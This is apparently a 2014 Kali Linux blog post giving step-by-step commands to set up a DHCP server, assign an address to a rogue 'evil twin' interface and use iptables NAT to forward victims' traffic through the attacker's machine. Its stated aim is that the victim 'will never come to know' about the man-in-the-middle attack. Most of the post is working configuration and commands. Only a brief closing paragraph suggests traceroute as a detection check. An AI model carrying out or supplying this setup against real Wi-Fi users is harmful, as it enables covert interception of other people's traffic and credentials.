---
author: AnirudhAnand
comments: true
date: 2014-09-28 08:57:08+00:00
layout: post
slug: configuring-dhcp3-man-middle-attacks
title: Configuring dhcp3 for man in the middle attacks !
wordpress_id: 187
categories:
- kali-linux
summary: How to setup your DHCP3 for employing man-in-the-middle attacks
---

Recently we have seen the **[Evil twins]({{ site.url }}/2014/09/28/man-in-the-middle-attack-using-evil-twins-in-kali-linux/)**_ method to do a man in the middle attack. But **[Evil twins]({{ site.url }}/2014/09/28/man-in-the-middle-attack-using-evil-twins-in-kali-linux/) **_attack is only complete if we can configure the dhcp services on our machine. Now why is that so ? Well, consider you saw a Wi-Fi named "Public Wi-Fi". Once you try to establish a connection with it, it will be only completed if it can assign an ip address to your PC.

Similarly, once you create an [**Evil twin**]({{ site.url }}/2014/09/28/man-in-the-middle-attack-using-evil-twins-in-kali-linux/), you also have to configure the dhcp services on your machine so that once the victim connects to it, he will be automatically assigned an ip address and gateway. If you have a wired internet connection (eth0) , then you can use dhcp services to route the victim's original packets to internet. Then the victim will never come to know that we have played a man in the middle attack. Configuring dhcp3 for man in the middle attacks :

1) First, Install dhcp3. For that use the command :

`sudo apt-get install dhcp-server`


This will install dhcp server to your machine. Now we have to configure the dhcp3.

2) Open the configuration file:

`sudo vim /etc/dhcp3/dhcpd.conf`


This will open the configuration file in vim (you can use any text editor you want). Make sure you keep a backup of the configuration file before making the changes (in case if you want to reset it ). Now add the following piece of information to it.

  `ddns-update-style ad-hoc;`
    
  `default-lease-time 600;`
    
  `max-lease-time 7200;`
    
  `subnet 192.168.2.0 netmask 255.255.255.0 {`
    
  `option subnet-mask 255.255.255.0;`
    
  `option broadcast-address 192.168.2.255;`
    
  `option routers 192.168.2.1;`
    
  `option domain-name-servers 8.8.8.8;`
    
  `range 192.168.2.100 192.168.2.175; }`

3) Then save the file and there, the configuration file is ready to use. Now we have to route the configuration so that victims connected will automatically get assigned by an ip address. Before that, you can create the Evil twin. You can [read about the Evil Twins here]({{ site.url }}/2014/09/28/man-in-the-middle-attack-using-evil-twins-in-kali-linux/).


4) After creating an Evil twin, we have a new interface called _**at0**_. Now we have to assign our ip to _**at0**_. For that use the command :

   `ifconfig at0 192.168.2.1/24`
   
   `route add -net 192.168.2.0 netmask 255.255.255.0 gw 192.168.2.1`

The above command will make sure the routing will be successful. Now we have to start the dhcp3 services :

 `sudo dhcp3d -cf /etc/dhcp3/dhcpd.conf -pf /var/run/dhcp3-server/dhcpd.pid at0`    
 
 `sudo /etc/init.d/dhcp3-server start`


The above commands will start the dhcp3 services on_** at0.**_

5) Now we have route the Incoming traffic from the victim at _**at0** _to ethernet connection _**eth0**_. To do that, we have to use the _**Network Address Translation (NAT)**_. Use the following commands one by one :
 `iptables --flush`
 
 `iptables --table nat --flush`
 
 `iptables --delete-chain`
 
 `iptables --table nat --delete-chain`
 
 `iptables --table nat --append POSTROUTING --out-interface eth0 -j MASQUERADE`
 
 `iptables --append FORWARD --in-interface at0 -j ACCEPT`
 
 `echo 1 > /proc/sys/net/ipv4/ip_forward`

That's it. We have successfully routed the _**at0**_ traffic to _**eth0**_.

The next question is how can we know that some one is doing a man in the middle attack while we are browsing on public Wi-Fi ?? The best way is to take a traceroute. _**Traceroute**_ will show through what all networks and places, your packets are going before reaching the destination. That's how you can understand whether some one is doing a man in the middle attack.

NOTE: 

  * While configuring the _**DHCP3**_ my _**eth0**_ address was 192.168.1.1. Thats why I configured  _**at0**_** **with 192.168.2.1.
	
  * If your IP range is different, do make changes accordingly.